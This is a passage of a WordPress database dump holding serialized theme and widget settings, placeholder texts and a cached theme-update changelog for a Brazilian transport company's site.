(159, 'theme_mods_alexandria', 'a:2:{i:0;b:0;s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1425706442;s:4:\"data\";a:5:{s:19:\"wp_inactive_widgets\";a:0:{}s:9:\"sidebar-1\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:11:\"footer-left\";a:0:{}s:13:\"footer-center\";a:0:{}s:12:\"footer-right\";N;}}}', 'yes'),
(160, 'theme_switched', '', 'yes'),
(161, 'optionsframework', 'a:1:{s:2:\"id\";s:8:\"spacious\";}', 'yes'),
(164, 'theme_mods_circle-lite', 'a:3:{i:0;b:0;s:16:\"header_textcolor\";s:6:\"dd3333\";s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1425706723;s:4:\"data\";a:15:{s:19:\"wp_inactive_widgets\";a:0:{}s:9:\"sidebar_1\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:9:\"sidebar_2\";a:0:{}s:9:\"sidebar_3\";a:0:{}s:9:\"sidebar_4\";N;s:9:\"sidebar_5\";N;s:9:\"sidebar_6\";N;s:9:\"sidebar_7\";N;s:9:\"sidebar_8\";N;s:9:\"sidebar_9\";N;s:10:\"sidebar_10\";N;s:10:\"sidebar_11\";N;s:10:\"sidebar_12\";N;s:10:\"sidebar_13\";N;s:10:\"sidebar_14\";N;}}}', 'yes'),
(166, 'theme_mods_exclusive', 'a:3:{i:0;b:0;s:16:\"background_color\";s:6:\"e3e1e2\";s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1425708739;s:4:\"data\";a:3:{s:19:\"wp_inactive_widgets\";a:0:{}s:9:\"sidebar-1\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:9:\"sidebar-2\";a:0:{}}}}', 'yes'),
(175, 'theme_mods_tatva-lite', 'a:2:{i:0;b:0;s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1425708816;s:4:\"data\";a:15:{s:19:\"wp_inactive_widgets\";a:0:{}s:12:\"sidebar-main\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:13:\"header-widget\";a:0:{}s:12:\"sidebar-shop\";N;s:14:\"home-featured1\";N;s:14:\"home-featured2\";N;s:17:\"sidebar-homepage1\";N;s:17:\"sidebar-homepage2\";N;s:17:\"sidebar-homepage3\";N;s:17:\"sidebar-homepage4\";N;s:20:\"homepage-testimonial\";N;s:15:\"sidebar-footer1\";N;s:15:\"sidebar-footer2\";N;s:15:\"sidebar-footer3\";N;s:15:\"sidebar-footer4\";N;}}}', 'yes'),
(177, 'theme_mods_green-lantern', 'a:2:{i:0;b:0;s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1425709034;s:4:\"data\";a:3:{s:19:\"wp_inactive_widgets\";a:0:{}s:15:\"sidebar-primary\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:18:\"footer-widget-area\";a:0:{}}}}', 'yes'),
(178, 'weblizar_options_gl', 'a:57:{s:17:\"upload_image_logo\";s:0:\"\";s:6:\"height\";s:2:\"55\";s:5:\"width\";s:3:\"150\";s:10:\"_frontpage\";s:2:\"on\";s:10:\"text_title\";s:3:\"off\";s:20:\"upload_image_favicon\";s:0:\"\";s:10:\"custom_css\";s:0:\"\";s:11:\"slide_image\";s:81:\"http://araujotrans.com.br/wp-content/themes/green-lantern/images/home-slide-1.png\";s:11:\"slide_title\";s:18:\"Revaluation Slider\";s:10:\"slide_desc\";s:43:\"Green lantern slider is Revaluation Slider.\";s:14:\"slide_btn_text\";s:9:\"Read More\";s:14:\"slide_btn_link\";s:1:\"#\";s:13:\"slide_image_1\";s:81:\"http://araujotrans.com.br/wp-content/themes/green-lantern/images/home-slide-2.png\";s:13:\"slide_title_1\";s:12:\"Touch slider\";s:12:\"slide_desc_1\";s:37:\"Green lantern slider is Touch Slider.\";s:16:\"slide_btn_text_1\";s:9:\"Read More\";s:16:\"slide_btn_link_1\";s:1:\"#\";s:13:\"slide_image_2\";s:81:\"http://araujotrans.com.br/wp-content/themes/green-lantern/images/home-slide-3.png\";s:13:\"slide_title_2\";s:17:\"Responsive slider\";s:12:\"slide_desc_2\";s:42:\"Green lantern slider is Responsive Slider.\";s:16:\"slide_btn_text_2\";s:9:\"Read More\";s:16:\"slide_btn_link_2\";s:1:\"#\";s:16:\"site_intro_title\";s:58:\"Weblizar theme is the theme that you have been waiting for\";s:15:\"site_intro_text\";s:300:\"Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old. Richard McClintock, a Latin professor at Hampden-Sydney College in Virginia, looked up one of the more obscure Latin words, consectetur.\";s:10:\"blog_title\";s:11:\"Latest Blog\";s:9:\"blog_text\";s:11:\"Latest Post\";s:36:\"social_media_in_contact_page_enabled\";s:2:\"on\";s:34:\"footer_section_social_media_enbled\";s:2:\"on\";s:25:\"social_media_twitter_link\";s:20:\"https://twitter.com/\";s:26:\"social_media_facebook_link\";s:20:\"https://facebook.com\";s:26:\"social_media_linkedin_link\";s:20:\"http://linkedin.com/\";s:24:\"social_media_google_plus\";s:24:\"https://plus.google.com/\";s:21:\"footer_customizations\";s:22:\" @ 2014 Weblizar Theme\";s:17:\"developed_by_text\";s:18:\"Theme Developed By\";s:26:\"developed_by_weblizar_text\";s:8:\"weblizar\";s:17:\"developed_by_link\";s:20:\"http://weblizar.com/\";s:15:\"service_1_title\";s:4:\"Idea\";s:15:\"service_1_icons\";s:17:\"fa fa-lightbulb-o\";s:14:\"service_1_text\";s:109:\"There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in.\";s:14:\"service_1_link\";s:1:\"#\";s:15:\"service_2_title\";s:6:\"Design\";s:15:\"service_2_icons\";s:12:\"fa fa-laptop\";s:14:\"service_2_text\";s:109:\"There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in.\";s:14:\"service_2_link\";s:1:\"#\";s:15:\"service_3_title\";s:10:\"management\";s:15:\"service_3_icons\";s:11:\"fa fa-tasks\";s:14:\"service_3_text\";s:109:\"There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in.\";s:14:\"service_3_link\";s:1:\"#\";s:15:\"service_4_title\";s:11:\"Development\";s:15:\"service_4_icons\";s:10:\"fa fa-code\";s:14:\"service_4_text\";s:109:\"There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in.\";s:14:\"service_4_link\";s:1:\"#\";s:11:\"latest_post\";s:11:\"Latest Post\";s:13:\"side_interval\";s:4:\"1000\";s:10:\"side_pause\";s:2:\"on\";s:11:\"style_sheet\";s:7:\"red.css\";s:30:\"weblizar_settings_save_general\";s:1:\"1\";}', 'yes'),
(180, 'theme_mods_clifden', 'a:2:{i:0;b:0;s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1425709522;s:4:\"data\";a:6:{s:19:\"wp_inactive_widgets\";a:0:{}s:7:\"default\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:15:\"top-bar-widgets\";a:0:{}s:20:\"above-footer-widgets\";N;s:15:\"footer1-widgets\";N;s:15:\"footer2-widgets\";N;}}}', 'yes'),
(181, 'wm-clifden-installed', '2', 'yes'),
(182, 'wm-clifden-static', 'a:1:{s:18:\"static-webdesigner\";s:92:\"This WordPress theme was created by WebMan - www.webmandesign.eu, http://www.webmandesign.eu\";}', 'yes'),
(183, 'notifier-cache-clifden', '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<notifier>\n	<latest>\n	1.9\n	</latest>\n	<message>\n	There is a new Clifden theme update available\n	</message>\n	<changelog>\n	<![CDATA[\n	<h3 class=\"title\">Version 1.9</h3>\n	<ul>\n		<li><strong>Added</strong>: Full WordPress 3.9 support</li>\n		<li><strong>Added</strong>: FlexSlider keyboard navigation for projects sliders</li>\n		<li><strong>Added</strong>: Zooming images in projects sliders (besides custom links applied on images)</li>\n		<li><strong>Added</strong>: Filter hooks for shortcodes, widgets, sliders and others</li>\n		<li><strong>Added</strong>: Next/previous post/project section</li>\n		<li><strong>Added</strong>: Support for Jetpack plugin\'s sharing feature</li>\n		<li><strong>Added</strong>: Font icons support for Content Modules</li>\n		<li><em>Updated</em>: Removed Refineslide slider for script incompatibility and end of development</li>\n		<li><em>Updated</em>: Font Awesome v4.1.0</li>\n		<li><em>Updated</em>: Admin fields and texts</li>\n		<li><em>Updated</em>: Admin interface</li>\n		<li><em>Updated</em>: Theme stylesheet being included with wp_enqueue_style() function</li>\n		<li><em>Updated</em>: Scripts: Isotope 2.0, FlexSlider 2.2.2, ImagesLoaded 3.1.6, Normalize.css 3.0.1, HTML5 Shiv 3.7.2</li>\n		<li><em>Updated</em>: Plugins: Slider Revolution 4.3.8</li>\n		<li><em>Updated</em>: Support for native WordPress video and audio shortcodes</li>\n		<li><em>Updated</em>: Logic of video/audio projects and post formats</li>\n		<li><em>Fixed</em>: Slideshow shortcode inside Content Module shortcode styling</li>\n		<li><em>Fixed</em>: Call to action title word wrapping</li>\n		<li><em>Fixed</em>: Project widget custom projects links</li>\n		<li><em>Fixed</em>: Missing localization strings</li>\n		<li><em>Fixed</em>: Caption shortcode throwing PHP error</li>\n	</ul>\n	]]>\n	</changelog>\n	<changefiles>\n	<![CDATA[\n	All localization files, Icon font files, functions.php, header.php, single-wm_projects.php, assets/css/borders.css, assets/css/content.css, assets/css/icons.css, assets/css/normalize.css, assets/css/shortcodes.css, assets/css/style.css.php, assets/css/wp-styles.css, assets/css/flex/flex.css, assets/js/flex/jquery.flexslider-min.js, assets/js/imagesloaded/jquery.imagesloaded.min.js, assets/js/isotope/jquery.isotope.min.js, assets/js/html5.js, assets/js/scripts.dev.js, assets/js/scripts.js, inc/formats/format.php, inc/formats/format-audio.php, inc/formats/format-gallery.php, inc/formats/format-link.php, inc/formats/format-video.php, inc/loop/loop-project.php, library/admin.php, library/core.php, library/setup.php, library/wm-options-panel.php, library/assets/css/admin-addon.css, library/assets/css/wm-options/wm-options-panel.css, library/assets/js/wm-options-panel.js, library/help/a-help.php, library/hooks/hooks.php, library/meta/a-meta-page.php, library/meta/a-meta-post.php, library/meta/m-cp-modules.php, library/meta/m-cp-projects.php, library/options/a-general.php, library/options/a-slider.php, library/shortcodes/shortcodes.php, library/shortcodes/shortcodes-generator.php, library/sliders/s-flex.php, library/sliders/s-nivo.php, library/sliders/s-refineslide.php, library/sliders/s-roundabout.php, library/widgets/w-cpprojects.php, library/widgets/w-postslist.php\n	]]>\n	</changefiles>\n</notifier>', 'yes'),
(184, 'notifier-cache-clifden-last-updated', '1425709037', 'yes'),
(185, 'wm-clifden', 'a:401:{s:24:\"wm-general-page-comments\";s:4:\"true\";s:24:\"wm-general-post-comments\";s:0:\"\";s:27:\"wm-general-project-comments\";s:4:\"true\";s:32:\"wm-general-comments-introduction\";s:0:\"\";s:25:\"wm-general-website-author\";s:28:\"WebMan - www.webmandesign.eu\";s:29:\"wm-general-search-placeholder\";s:11:\"Search term\";s:15:\"wm-general-gzip\";s:0:\"\";s:21:\"wm-general-valid-html\";s:0:\"\";s:23:\"wm-general-no-css-cache\";s:0:\"\";s:18:\"wm-general-no-help\";s:0:\"\";s:29:\"wm-general-no-update-notifier\";s:0:\"\";s:23:\"wm-general-default-menu\";s:0:\"\";s:31:\"wm-general-projects-image-ratio\";s:8:\"ratio-32\";s:27:\"wm-general-post-image-ratio\";s:8:\"ratio-32\";s:30:\"wm-general-gallery-image-ratio\";s:8:\"ratio-32\";s:28:\"wm-general-staff-image-ratio\";s:8:\"ratio-11\";s:23:\"wm-general-lightbox-img\";s:5:\"large\";s:22:\"wm-general-no-lightbox\";s:0:\"\";s:33:\"wm-general-modules-role-container\";s:0:\"\";s:23:\"wm-general-role-modules\";s:4:\"page\";s:27:\"wm-general-permalink-module\";s:6:\"module\";s:28:\"wm-general-modules-revisions\";s:0:\"\";s:29:\"wm-general-faq-role-container\";s:0:\"\";s:19:\"wm-general-role-faq\";s:4:\"post\";s:24:\"wm-general-permalink-faq\";s:3:\"faq\";s:24:\"wm-general-faq-revisions\";s:0:\"\";s:31:\"wm-general-logos-role-container\";s:0:\"\";s:21:\"wm-general-role-logos\";s:4:\"post\";s:26:\"wm-general-permalink-logos\";s:4:\"logo\";s:32:\"wm-general-prices-role-container\";s:0:\"\";s:22:\"wm-general-role-prices\";s:4:\"page\";s:26:\"wm-general-permalink-price\";s:5:\"price\";s:34:\"wm-general-projects-role-container\";s:0:\"\";s:24:\"wm-general-role-projects\";s:4:\"post\";s:28:\"wm-general-permalink-project\";s:7:\"project\";s:37:\"wm-general-permalink-project-category\";s:16:\"project/category\";s:29:\"wm-general-projects-revisions\";s:0:\"\";s:33:\"wm-general-projects-disable-image\";s:0:\"\";s:34:\"wm-general-projects-disable-slider\";s:0:\"\";s:33:\"wm-general-projects-disable-audio\";s:0:\"\";s:33:\"wm-general-projects-disable-video\";s:0:\"\";s:33:\"wm-general-project-default-layout\";s:4:\"me-4\";s:32:\"wm-general-projects-default-atts\";a:0:{}s:32:\"wm-general-slides-role-container\";s:0:\"\";s:22:\"wm-general-role-slides\";s:4:\"page\";s:26:\"wm-general-permalink-slide\";s:5:\"slide\";s:27:\"wm-general-slides-revisions\";s:0:\"\";s:31:\"wm-general-staff-role-container\";s:0:\"\";s:21:\"wm-general-role-staff\";s:4:\"page\";s:21:\"wm-general-staff-rich\";s:0:\"\";s:26:\"wm-general-permalink-staff\";s:5:\"staff\";s:37:\"wm-general-permalink-staff-department\";s:16:\"staff/department\";s:26:\"wm-general-staff-revisions\";s:0:\"\";s:23:\"wm-general-tpl-home_php\";s:0:\"\";s:35:\"wm-general-tpl-tpl_construction_php\";s:0:\"\";s:30:\"wm-general-tpl-tpl_landing_php\";s:0:\"\";s:26:\"wm-general-tpl-tpl_map_php\";s:0:\"\";s:32:\"wm-general-tpl-tpl_portfolio_php\";s:0:\"\";s:31:\"wm-general-tpl-tpl_redirect_php\";s:0:\"\";s:31:\"wm-general-tpl-tpl_sections_php\";s:0:\"\";s:30:\"wm-general-tpl-tpl_sitemap_php\";s:0:\"\";s:22:\"wm-general-client-area\";s:0:\"\";s:27:\"wm-blog-blog-excerpt-length\";i:40;s:18:\"wm-blog-full-posts\";s:0:\"\";s:30:\"wm-blog-disable-featured-image\";s:0:\"\";s:22:\"wm-blog-disable-author\";s:0:\"\";s:20:\"wm-blog-disable-date\";s:0:\"\";s:20:\"wm-blog-disable-cats\";s:0:\"\";s:20:\"wm-blog-disable-tags\";s:0:\"\";s:30:\"wm-blog-disable-comments-count\";s:0:\"\";s:22:\"wm-blog-disable-format\";s:0:\"\";s:19:\"wm-blog-disable-bio\";s:0:\"\";s:26:\"wm-blog-archive-no-sidebar\";s:0:\"\";s:21:\"wm-branding-logo-type\";s:3:\"img\";s:24:\"wm-branding-logo-img-url\";s:0:\"\";s:23:\"wm-branding-logo-margin\";i:-1;s:27:\"wm-branding-favicon-url-ico\";s:83:\"http://araujotrans.com.br/wp-content/themes/clifden/assets/img/branding/favicon.ico\";s:27:\"wm-branding-favicon-url-png\";s:83:\"http://araujotrans.com.br/wp-content/themes/clifden/assets/img/branding/favicon.png\";s:29:\"wm-branding-touch-icon-url-54\";s:89:\"http://araujotrans.com.br/wp-content/themes/clifden/assets/img/branding/touch-icon-54.png\";s:30:\"wm-branding-touch-icon-url-114\";s:90:\"http://araujotrans.com.br/wp-content/themes/clifden/assets/img/branding/touch-icon-114.png\";s:30:\"wm-branding-touch-icon-url-144\";s:90:\"http://araujotrans.com.br/wp-content/themes/clifden/assets/img/branding/touch-icon-144.png\";s:19:\"wm-branding-credits\";s:23:\"(C) Araújo Transportes\";s:22:\"wm-branding-login-logo\";s:60:\"http://araujotrans.com.br/wp-admin/images/wordpress-logo.png\";s:29:\"wm-branding-login-logo-height\";i:100;s:26:\"wm-branding-login-bg-color\";s:0:\"\";s:28:\"wm-branding-login-bg-img-url\";s:0:\"\";s:33:\"wm-branding-login-bg-img-position\";s:5:\"50% 0\";s:31:\"wm-branding-login-bg-img-repeat\";s:9:\"no-repeat\";s:35:\"wm-branding-login-bg-img-attachment\";s:6:\"scroll\";s:28:\"wm-branding-login-bg-pattern\";s:0:\"\";s:31:\"wm-branding-login-form-bg-color\";s:0:\"\";s:38:\"wm-branding-login-form-button-bg-color\";s:0:\"\";s:28:\"wm-branding-login-link-color\";s:0:\"\";s:31:\"wm-branding-login-link-bg-color\";s:0:\"\";s:34:\"wm-branding-login-message-bg-color\";s:0:\"\";s:26:\"wm-branding-admin-use-logo\";s:4:\"true\";s:29:\"wm-branding-admin-bar-no-logo\";s:4:\"true\";s:22:\"wm-branding-admin-logo\";s:99:\"http://araujotrans.com.br/wp-content/themes/clifden/assets/img/branding/logo-clifden-admin-main.png\";s:24:\"wm-branding-admin-footer\";s:0:\"\";s:22:\"wm-branding-panel-logo\";s:94:\"http://araujotrans.com.br/wp-content/themes/clifden/assets/img/branding/logo-clifden-admin.png\";s:25:\"wm-branding-panel-no-logo\";s:0:\"\";s:29:\"wm-branding-remove-menu-posts\";s:0:\"\";s:29:\"wm-branding-remove-menu-media\";s:0:\"\";s:29:\"wm-branding-remove-menu-links\";s:0:\"\";s:32:\"wm-branding-remove-menu-comments\";s:0:\"\";s:37:\"wm-branding-remove-dash-incominglinks\";s:0:\"\";s:35:\"wm-branding-remove-dash-wpsecondary\";s:0:\"\";s:31:\"wm-branding-remove-dash-plugins\";s:0:\"\";s:34:\"wm-branding-remove-dash-quickpress\";s:0:\"\";s:38:\"wm-branding-remove-dash-recentcomments\";s:0:\"\";s:36:\"wm-branding-remove-dash-recentdrafts\";s:0:\"\";s:32:\"wm-branding-remove-dash-rightnow\";s:0:\"\";s:33:\"wm-branding-remove-dash-wpprimary\";s:0:\"\";s:35:\"wm-branding-remove-dash-quickaccess\";s:0:\"\";s:34:\"wm-branding-dash-quickaccess-title\";s:12:\"Quick Access\";s:33:\"wm-branding-dash-quickaccess-text\";s:0:\"\";s:19:\"wm-widgets-sidebars\";a:1:{i:0;s:18:\"Custom widget area\";}s:20:\"wm-slider-max-number\";i:10;s:23:\"wm-slider-custom-remove\";s:0:\"\";s:21:\"wm-slider-flex-remove\";s:0:\"\";s:29:\"wm-slider-flex-slideshowSpeed\";i:6000;s:29:\"wm-slider-flex-animationSpeed\";i:600;s:27:\"wm-slider-flex-pauseOnHover\";s:4:\"true\";s:28:\"wm-slider-flex-pauseOnAction\";s:4:\"true\";s:24:\"wm-slider-flex-animation\";s:5:\"slide\";s:25:\"wm-slider-flex-controlNav\";s:0:\"\";s:27:\"wm-slider-flex-directionNav\";s:0:\"\";s:21:\"wm-slider-nivo-remove\";s:0:\"\";s:24:\"wm-slider-nivo-pauseTime\";i:6000;s:24:\"wm-slider-nivo-animSpeed\";i:600;s:27:\"wm-slider-nivo-pauseOnHover\";s:4:\"true\";s:21:\"wm-slider-nivo-effect\";s:9:\"sliceDown\";s:21:\"wm-slider-nivo-slices\";i:8;s:22:\"wm-slider-nivo-boxCols\";i:8;s:22:\"wm-slider-nivo-boxRows\";i:4;s:25:\"wm-slider-nivo-controlNav\";s:0:\"\";s:27:\"wm-slider-nivo-directionNav\";s:0:\"\";s:31:\"wm-slider-nivo-directionNavHide\";s:4:\"true\";s:27:\"wm-slider-roundabout-remove\";s:0:\"\";s:37:\"wm-slider-roundabout-autoplayDuration\";i:6000;s:29:\"wm-slider-roundabout-duration\";i:600;s:41:\"wm-slider-roundabout-autoplayPauseOnHover\";s:4:\"true\";s:28:\"wm-slider-roundabout-reflect\";s:0:\"\";s:26:\"wm-slider-roundabout-shape\";s:9:\"lazySusan\";s:27:\"wm-slider-roundabout-easing\";s:11:\"easeOutCirc\";s:31:\"wm-slider-roundabout-minOpacity\";i:40;s:29:\"wm-slider-roundabout-minScale\";i:40;s:31:\"wm-slider-roundabout-enableDrag\";s:4:\"true\";s:33:\"wm-slider-roundabout-dropDuration\";i:600;s:24:\"wm-social-share-facebook\";s:0:\"\";s:23:\"wm-social-share-twitter\";s:0:\"\";s:26:\"wm-social-share-googleplus\";s:0:\"\";s:25:\"wm-social-share-pinterest\";s:0:\"\";s:27:\"wm-social-share-no-projects\";s:0:\"\";s:21:\"wm-social-share-pages\";s:0:\"\";s:26:\"wm-social-projects-in-feed\";s:0:\"\";s:27:\"wm-social-no-auto-feed-link\";s:0:\"\";s:20:\"wm-social-feed-array\";a:1:{i:0;a:2:{s:4:\"attr\";s:0:\"\";s:3:\"val\";s:0:\"\";}}s:15:\"wm-layout-boxed\";s:5:\"boxed\";s:15:\"wm-layout-width\";s:4:\"r930\";s:23:\"wm-layout-sidebar-width\";s:10:\" five pane\";s:29:\"wm-layout-no-related-projects\";s:0:\"\";s:32:\"wm-layout-related-projects-title\";s:0:\"\";s:23:\"wm-design-header-height\";i:0;s:23:\"wm-design-top-bar-fixed\";s:0:\"\";s:29:\"wm-layout-navigation-position\";s:10:\" nav-right\";s:22:\"wm-layout-header-right\";s:248:\"<strong><i class=\"icon-phone\"></i> 0999 123 456</strong> &nbsp;&nbsp;|&nbsp;&nbsp; [social url=\"#\" icon=\"Facebook\" size=\"s\" /][social url=\"#\" icon=\"Twitter\" size=\"s\" /][social url=\"#\" icon=\"Google+\" size=\"s\" /][social url=\"#\" icon=\"RSS\" size=\"s\" /]\";s:29:\"wm-layout-header-right-margin\";i:-1;s:21:\"wm-layout-breadcrumbs\";s:5:\"stick\";s:30:\"wm-layout-breadcrumbs-archives\";s:0:\"\";s:25:\"wm-layout-breadcrumbs-404\";s:0:\"\";s:36:\"wm-layout-breadcrumbs-animate-search\";s:14:\" animated-form\";s:31:\"wm-layout-breadcrumbs-no-search\";s:0:\"\";s:36:\"wm-layout-breadcrumbs-portfolio-page\";s:1:\"0\";s:14:\"wm-design-skin\";s:10:\"ubuntu.css\";s:20:\"wm-design-link-color\";s:6:\"ff0000\";s:22:\"wm-heading-to-set-blue\";s:0:\"\";s:18:\"wm-design-set-blue\";s:0:\"\";s:28:\"wm-design-type-blue-bg-color\";s:6:\"0169c9\";s:25:\"wm-design-type-blue-color\";s:6:\"ffffff\";s:22:\"wm-heading-to-set-gray\";s:0:\"\";s:18:\"wm-design-set-gray\";s:0:\"\";s:28:\"wm-design-type-gray-bg-color\";s:6:\"eeeeee\";s:25:\"wm-design-type-gray-color\";s:6:\"666666\";s:23:\"wm-heading-to-set-green\";s:0:\"\";s:19:\"wm-design-set-green\";s:0:\"\";s:29:\"wm-design-type-green-bg-color\";s:6:\"339900\";s:26:\"wm-design-type-green-color\";s:6:\"ffffff\";s:24:\"wm-heading-to-set-orange\";s:0:\"\";s:20:\"wm-design-set-orange\";s:0:\"\";s:30:\"wm-design-type-orange-bg-color\";s:6:\"db7100\";s:27:\"wm-design-type-orange-color\";s:6:\"ffffff\";s:21:\"wm-heading-to-set-red\";s:0:\"\";s:17:\"wm-design-set-red\";s:0:\"\";s:27:\"wm-design-type-red-bg-color\";s:6:\"fd3301\";s:24:\"wm-design-type-red-color\";s:6:\"ffffff\";s:31:\"wm-design-toppanel-bg-container\";s:0:\"\";s:24:\"wm-design-toppanel-sub-1\";s:0:\"\";s:27:\"wm-design-toppanel-bg-color\";s:0:\"\";s:24:\"wm-design-toppanel-color\";s:0:\"\";s:29:\"wm-design-toppanel-link-color\";s:0:\"\";s:31:\"wm-design-toppanel-border-color\";s:0:\"\";s:24:\"wm-design-toppanel-icons\";s:0:\"\";s:24:\"wm-design-toppanel-sub-2\";s:0:\"\";s:29:\"wm-design-toppanel-bg-img-url\";s:0:\"\";s:34:\"wm-design-toppanel-bg-img-position\";s:5:\"50% 0\";s:32:\"wm-design-toppanel-bg-img-repeat\";s:9:\"no-repeat\";s:36:\"wm-design-toppanel-bg-img-attachment\";s:6:\"scroll\";s:24:\"wm-design-toppanel-sub-3\";s:0:\"\";s:29:\"wm-design-toppanel-bg-pattern\";s:0:\"\";s:29:\"wm-design-header-bg-container\";s:0:\"\";s:22:\"wm-design-header-sub-1\";s:0:\"\";s:25:\"wm-design-header-bg-color\";s:0:\"\";s:22:\"wm-design-header-color\";s:0:\"\";s:29:\"wm-design-header-border-color\";s:0:\"\";s:22:\"wm-design-header-icons\";s:12:\" light-icons\";s:22:\"wm-design-header-sub-2\";s:0:\"\";s:27:\"wm-design-header-bg-img-url\";s:0:\"\";s:32:\"wm-design-header-bg-img-position\";s:5:\"50% 0\";s:30:\"wm-design-header-bg-img-repeat\";s:9:\"no-repeat\";s:34:\"wm-design-header-bg-img-attachment\";s:6:\"scroll\";s:22:\"wm-design-header-sub-3\";s:0:\"\";s:27:\"wm-design-header-bg-pattern\";s:0:\"\";s:33:\"wm-design-navigation-bg-container\";s:0:\"\";s:26:\"wm-design-navigation-sub-1\";s:0:\"\";s:29:\"wm-design-navigation-bg-color\";s:0:\"\";s:26:\"wm-design-navigation-color\";s:0:\"\";s:33:\"wm-design-navigation-border-color\";s:0:\"\";s:32:\"wm-design-subnavigation-bg-color\";s:0:\"\";s:29:\"wm-design-subnavigation-color\";s:0:\"\";s:26:\"wm-design-navigation-icons\";s:12:\" light-icons\";s:26:\"wm-design-navigation-sub-2\";s:0:\"\";s:31:\"wm-design-navigation-bg-img-url\";s:0:\"\";s:36:\"wm-design-navigation-bg-img-position\";s:5:\"50% 0\";s:34:\"wm-design-navigation-bg-img-repeat\";s:9:\"no-repeat\";s:38:\"wm-design-navigation-bg-img-attachment\";s:6:\"scroll\";s:26:\"wm-design-navigation-sub-3\";s:0:\"\";s:31:\"wm-design-navigation-bg-pattern\";s:0:\"\";s:29:\"wm-design-slider-bg-container\";s:0:\"\";s:22:\"wm-design-slider-sub-1\";s:0:\"\";s:25:\"wm-design-slider-bg-color\";s:0:\"\";s:29:\"wm-design-slider-border-color\";s:0:\"\";s:22:\"wm-design-slider-sub-2\";s:0:\"\";s:27:\"wm-design-slider-bg-img-url\";s:0:\"\";s:32:\"wm-design-slider-bg-img-position\";s:5:\"50% 0\";s:30:\"wm-design-slider-bg-img-repeat\";s:9:\"no-repeat\";s:34:\"wm-design-slider-bg-img-attachment\";s:6:\"scroll\";s:22:\"wm-design-slider-sub-3\";s:0:\"\";s:27:\"wm-design-slider-bg-pattern\";s:0:\"\";s:34:\"wm-design-mainheading-bg-container\";s:0:\"\";s:27:\"wm-design-mainheading-sub-1\";s:0:\"\";s:30:\"wm-design-mainheading-bg-color\";s:0:\"\";s:27:\"wm-design-mainheading-color\";s:0:\"\";s:31:\"wm-design-mainheading-alt-color\";s:0:\"\";s:32:\"wm-design-mainheading-link-color\";s:0:\"\";s:34:\"wm-design-mainheading-border-color\";s:0:\"\";s:32:\"wm-design-main-heading-alignment\";s:4:\"left\";s:27:\"wm-design-mainheading-sub-2\";s:0:\"\";s:32:\"wm-design-mainheading-bg-img-url\";s:0:\"\";s:37:\"wm-design-mainheading-bg-img-position\";s:5:\"50% 0\";s:35:\"wm-design-mainheading-bg-img-repeat\";s:9:\"no-repeat\";s:39:\"wm-design-mainheading-bg-img-attachment\";s:6:\"scroll\";s:27:\"wm-design-mainheading-sub-3\";s:0:\"\";s:32:\"wm-design-mainheading-bg-pattern\";s:0:\"\";s:34:\"wm-design-pageexcerpt-bg-container\";s:0:\"\";s:27:\"wm-design-pageexcerpt-sub-1\";s:0:\"\";s:30:\"wm-design-pageexcerpt-bg-color\";s:0:\"\";s:27:\"wm-design-pageexcerpt-color\";s:0:\"\";s:31:\"wm-design-pageexcerpt-alt-color\";s:0:\"\";s:32:\"wm-design-pageexcerpt-link-color\";s:0:\"\";s:34:\"wm-design-pageexcerpt-border-color\";s:0:\"\";s:27:\"wm-design-pageexcerpt-icons\";s:12:\" light-icons\";s:27:\"wm-design-pageexcerpt-sub-2\";s:0:\"\";s:32:\"wm-design-pageexcerpt-bg-img-url\";s:0:\"\";s:37:\"wm-design-pageexcerpt-bg-img-position\";s:5:\"50% 0\";s:35:\"wm-design-pageexcerpt-bg-img-repeat\";s:9:\"no-repeat\";s:39:\"wm-design-pageexcerpt-bg-img-attachment\";s:6:\"scroll\";s:27:\"wm-design-pageexcerpt-sub-3\";s:0:\"\";s:32:\"wm-design-pageexcerpt-bg-pattern\";s:0:\"\";s:30:\"wm-design-content-bg-container\";s:0:\"\";s:23:\"wm-design-content-sub-1\";s:0:\"\";s:26:\"wm-design-content-bg-color\";s:0:\"\";s:23:\"wm-design-content-color\";s:0:\"\";s:27:\"wm-design-content-alt-color\";s:0:\"\";s:30:\"wm-design-content-border-color\";s:0:\"\";s:23:\"wm-design-content-icons\";s:0:\"\";s:23:\"wm-design-content-sub-2\";s:0:\"\";s:28:\"wm-design-content-bg-img-url\";s:0:\"\";s:33:\"wm-design-content-bg-img-position\";s:5:\"50% 